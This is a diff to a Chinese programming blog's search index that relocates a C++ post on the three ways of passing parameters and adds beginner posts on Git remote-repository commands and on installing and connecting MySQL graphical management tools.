@@ -534,34 +534,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C++的三种传值方式</title>
-    <url>/2022/04/06/C-%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h1 id="传值-按值传递"><a href="#传值-按值传递" class="headerlink" title="传值/按值传递"></a>传值/按值传递</h1><p><strong>值传递：</strong></p>
-<p>形参是实参的拷贝，<strong>改变形参的值并不会影响外部实参的值</strong>。从被调用函数的角度来说，值传递是单向的（实参-&gt;形参），<strong>参数的值只能传入，不能传出</strong>。当函数内部需要修改参数，并且不希望这个改变影响调用者时，采用值传递。</p>
-<span id="more"></span>
-
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change1</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;;</span><br><span class="line">	<span class="built_in">change1</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="传地址-按地址传递-指针传递"><a href="#传地址-按地址传递-指针传递" class="headerlink" title="传地址/按地址传递/指针传递"></a>传地址/按地址传递/指针传递</h1><p><strong>指针传递：</strong></p>
-<p>形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作，可以改变实参的值。其<strong>实质是传参</strong>，只不过这里的参数是一个指针。这里的指针比较特殊，可以当作参数使用。若将change2函数里的代码拿到main里面，却不能执行。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change2</span><span class="params">(<span class="keyword">int</span> *a)</span><span class="comment">//传地址/按地址传递 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	*a = <span class="number">3</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change2</span>(&amp;a);</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>错误示例</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	*a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//执行完之后，返回结果为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正确用法</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	a=&amp;b;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="传引用-按引用传递"><a href="#传引用-按引用传递" class="headerlink" title="传引用/按引用传递"></a>传引用/按引用传递</h1><p><strong>引用传递：</strong></p>
-<p>形参相当于是实参的“别名”，<strong>对形参的操作其实就是对实参的操作</strong>，在引用传递过程中，被调函数的形式参数虽然也作为局部变量在栈中开辟了内存空间，但是这时存放的是由主调函数放进来的实参变量的地址。<strong>被调函数对形参的任何操作都被处理成间接寻址，即通过栈中存放的地址访问主调函数中的实参变量</strong>。正因为如此，被调函数对形参做的任何操作都影响了主调函数中的实参变量。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change3</span><span class="params">(<span class="keyword">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change3</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C++的函数</title>
     <url>/2022/01/17/C-%E7%9A%84%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>将一串经常会使用的代码封装起来，减少重复代码。一个较大的程序，一般分为若干个程序块，每个模块实现特定的功能。</p>
@@ -636,6 +608,139 @@
 ]]></content>
       <tags>
         <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C++的三种传值方式</title>
+    <url>/2022/04/06/C-%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="传值-按值传递"><a href="#传值-按值传递" class="headerlink" title="传值/按值传递"></a>传值/按值传递</h1><p><strong>值传递：</strong></p>
+<p>形参是实参的拷贝，<strong>改变形参的值并不会影响外部实参的值</strong>。从被调用函数的角度来说，值传递是单向的（实参-&gt;形参），<strong>参数的值只能传入，不能传出</strong>。当函数内部需要修改参数，并且不希望这个改变影响调用者时，采用值传递。</p>
+<span id="more"></span>
+
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change1</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;;</span><br><span class="line">	<span class="built_in">change1</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="传地址-按地址传递-指针传递"><a href="#传地址-按地址传递-指针传递" class="headerlink" title="传地址/按地址传递/指针传递"></a>传地址/按地址传递/指针传递</h1><p><strong>指针传递：</strong></p>
+<p>形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作，可以改变实参的值。其<strong>实质是传参</strong>，只不过这里的参数是一个指针。这里的指针比较特殊，可以当作参数使用。若将change2函数里的代码拿到main里面，却不能执行。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change2</span><span class="params">(<span class="keyword">int</span> *a)</span><span class="comment">//传地址/按地址传递 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	*a = <span class="number">3</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change2</span>(&amp;a);</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>错误示例</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	*a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//执行完之后，返回结果为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正确用法</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	a=&amp;b;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="传引用-按引用传递"><a href="#传引用-按引用传递" class="headerlink" title="传引用/按引用传递"></a>传引用/按引用传递</h1><p><strong>引用传递：</strong></p>
+<p>形参相当于是实参的“别名”，<strong>对形参的操作其实就是对实参的操作</strong>，在引用传递过程中，被调函数的形式参数虽然也作为局部变量在栈中开辟了内存空间，但是这时存放的是由主调函数放进来的实参变量的地址。<strong>被调函数对形参的任何操作都被处理成间接寻址，即通过栈中存放的地址访问主调函数中的实参变量</strong>。正因为如此，被调函数对形参做的任何操作都影响了主调函数中的实参变量。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change3</span><span class="params">(<span class="keyword">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change3</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git远程库相关操作</title>
+    <url>/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<h1 id="添加远程库及推送"><a href="#添加远程库及推送" class="headerlink" title="添加远程库及推送"></a>添加远程库及推送</h1><p>命令：<code>git remote add 地址名 HTTP或SSH地址</code></p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111201215014.png" alt="image-20220111201215014"></p>
+<p>执行完后，如以下页面</p>
+<span id="more"></span>
+
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111201612020.png" alt="image-20220111201612020"></p>
+<p>推送命令：<code>git push 地址名 分支名</code>，执行后报错</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202306396.png" alt="image-20220111202306396"></p>
+<p>因为git在拉取或者提交项目时，中间会有git的http和https代理，但是我们本地环境本身就有SSL协议了，所以取消git的https代理即可，不行再取消http的代理。</p>
+<p>取消指令为：</p>
+<p>取消http代理<br><code>git config --global --unset http.proxy</code><br>取消https代理<br><code>git config --global --unset https.proxy</code></p>
+<p>也可以直接用ssh地址，设置ssh协议的方法可参考<a href="https://zhuanlan.zhihu.com/p/103391101">这里</a></p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202436988.png" alt="image-20220111202436988"></p>
+<p>然后查看远程库，即可发现文件</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202501488.png" alt="image-20220111202501488"></p>
+<h1 id="克隆远程库到本地"><a href="#克隆远程库到本地" class="headerlink" title="克隆远程库到本地"></a>克隆远程库到本地</h1><p>命令：<code>git clone 克隆地址</code>，克隆地址为下（克隆不需要再初始化）</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111203222264.png" alt="image-20220111203222264"></p>
+<p>操作如下</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111203419197.png" alt="image-20220111203419197"></p>
+<p>克隆的三个操作</p>
+<ul>
+<li>完整的把远程库下载到本地</li>
+<li>创建origin远程库地址别名</li>
+<li>初始化本地库</li>
+</ul>
+<h2 id="推送本地库到远程库"><a href="#推送本地库到远程库" class="headerlink" title="推送本地库到远程库"></a>推送本地库到远程库</h2><p>命令：<code>git push 远程库地址别名 分支名</code>（前提是，发出提交的Github账户在该团队内，邀请在GitHub内进行）</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111212540339.png" alt="image-20220111212540339"></p>
+<p>邀请加入后</p>
+<p>这里仍然要用ssh协议</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111210851950.png" alt="image-20220111210851950"></p>
+<p>内容推送上去后，远程库内容改变</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211327947.png" alt="image-20220111211327947"></p>
+<h1 id="拉取远程库到本地库"><a href="#拉取远程库到本地库" class="headerlink" title="拉取远程库到本地库"></a>拉取远程库到本地库</h1><p>然后切换另一编辑者，也就是库的创建者</p>
+<p>执行抓取操作：<code>git fetch 地址别名 分支</code></p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211608126.png" alt="image-20220111211608126"></p>
+<p>抓取下来后可看到，本地库文件并没有改变</p>
+<p>切换分支：<code>git checkout 地址别名/分支名</code></p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211801979.png" alt="image-20220111211801979"></p>
+<p>可看到，内容已经改变（多了一行g）</p>
+<p>然后要将远程库合并到本地库就要切换到master分支，然后执行：<code>git merge 地址别名/分支名</code></p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111220729815.png" alt="image-20220111220729815"></p>
+<p>以上适用于需要检查代码的情况，比较麻烦</p>
+<p>若是追求简单，则可直接执行：<code>git pull 地址别名 分支名</code>同样可拿到远程库内容</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111220915812.png" alt="image-20220111220915812"></p>
+<p><strong><u>总结：push=fetch+merge</u></strong></p>
+<h1 id="推送时的矛盾"><a href="#推送时的矛盾" class="headerlink" title="推送时的矛盾"></a>推送时的矛盾</h1><p>若两个人同时对远程库进行推送，则推送晚者不能推送，只能拉取最新的库，然后再进行修改、推送</p>
+<p>冲突页面如下</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221428737.png" alt="image-20220111221428737"></p>
+<p>拉取远程库文件</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221617497.png" alt="image-20220111221617497"></p>
+<p>打开冲突的文件</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221505181.png" alt="image-20220111221505181"></p>
+<p>删去多余行目，然后提交到本地库</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221923785.png" alt="image-20220111221923785"></p>
+<p>然后再推送到远程库</p>
+<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111222029729.png" alt="image-20220111222029729"></p>
+<p><strong>这种机制的目的避免了推送混乱</strong></p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL常用的图形管理工具</title>
+    <url>/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>日常开发中，如果在类似dos窗口中进行，对于初学者来说，上手难度高，也显得枯燥乏味，所以我们用MySQL图形管理工具来连接MySQL，然后在图形化界面上操作。</p>
+<p>MySQL的管理维护工具非常多，除了系统自带的命令行管理工具外，还有许多其他的图形管理工具。</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113170325596.png" alt="image-20220113170325596"></p>
+<h1 id="常用工具介绍"><a href="#常用工具介绍" class="headerlink" title="常用工具介绍"></a>常用工具介绍</h1><h2 id="Navicat（第一批队）"><a href="#Navicat（第一批队）" class="headerlink" title="Navicat（第一批队）"></a>Navicat（第一批队）</h2><p>Navicat是一套快速、可靠的数据库管理工具，Navicat是以直觉化的图形用户界面而建的，可以兼容多种昂数据库，支持多种操作系统。</p>
+<span id="more"></span>
+
+<h2 id="SQLyog（第一批队）"><a href="#SQLyog（第一批队）" class="headerlink" title="SQLyog（第一批队）"></a>SQLyog（第一批队）</h2><p>SQLyog是一个快速而简洁的图形化管理MySQL数据库工具，他能后在任何地方有效管理你的数据库，由业界著名的Webyog公司出品</p>
+<p>使用SQLyog可以快速直观地让您从世界的任何角落通过网络来维护远端的MySQL数据库</p>
+<h2 id="MySQL-Workbench（第一批队）"><a href="#MySQL-Workbench（第一批队）" class="headerlink" title="MySQL Workbench（第一批队）"></a>MySQL Workbench（第一批队）</h2><p>MySQL Workbench是MySQL官方提供的图形化管理工具，分为社区版和商业版，社区版完全免费，而商业版则是按年收费。支持数据库的创建、设计、迁移、备份、到处和导入等功能，并且支持Windows、Linux和mac等主流的操作系统</p>
+<h2 id="DataGrip（第二批队）"><a href="#DataGrip（第二批队）" class="headerlink" title="DataGrip（第二批队）"></a>DataGrip（第二批队）</h2><p>DataGrip是大名鼎鼎的JetBrains公司出品的，就是那个出品Intellij IDEA的公司。</p>
+<p>DataGrip是一款数据库管理客户端工具，方便连接到数据库服务，执行sql、创建表、创建索引以及导出数据等。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
+<li>phpMyAdmin</li>
+<li>MySQLDumper</li>
+<li>MySQL GUI Tools（官网提供）</li>
+<li>MySQL ODBS Connector</li>
+</ul>
+<h1 id="图形管理工具安装"><a href="#图形管理工具安装" class="headerlink" title="图形管理工具安装"></a>图形管理工具安装</h1><h2 id="Navicat的安装"><a href="#Navicat的安装" class="headerlink" title="Navicat的安装"></a>Navicat的安装</h2><p>去<a href="https://navicat.com.cn/products">官网</a>下载安装包（<a href="https://cloud.tencent.com/developer/article/1804255">白嫖请参考</a>）并安装</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113173117017.png" alt="image-20220113173117017"></p>
+<p>安装完成后</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113174323767.png" alt="image-20220113174323767"></p>
+<h2 id="SQLyog的安装"><a href="#SQLyog的安装" class="headerlink" title="SQLyog的安装"></a>SQLyog的安装</h2><p><a href="https://sqlyog.softonic.nl/">点击此处</a>下载安装包，下载完成后安装（<a href="https://www.cnblogs.com/pengpengdeyuan/p/14364777.html">白嫖参考</a>也可以下载<a href="https://github.com/webyog/sqlyog-community/wiki/Downloads">社区版</a>）</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113175137345.png" alt="image-20220113175137345"></p>
+<p>一直点下一步即可</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113184750571.png" alt="image-20220113184750571"></p>
+<h1 id="图形化管理工具连接MySQL"><a href="#图形化管理工具连接MySQL" class="headerlink" title="图形化管理工具连接MySQL"></a>图形化管理工具连接MySQL</h1><h2 id="Navicat连接"><a href="#Navicat连接" class="headerlink" title="Navicat连接"></a>Navicat连接</h2><p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113190355479.png" alt="image-20220113190355479"></p>
+<p>注意：此时主机连接的是本地地址，若是远程的要输入对应ip</p>
+<p>连接成功后</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113190605114.png" alt="image-20220113190605114"></p>
+<h2 id="SQLyog连接"><a href="#SQLyog连接" class="headerlink" title="SQLyog连接"></a>SQLyog连接</h2><p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113191121646.png" alt="image-20220113191121646"></p>
+<p>点击是，连接成功</p>
+<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113191138375.png" alt="image-20220113191138375"></p>
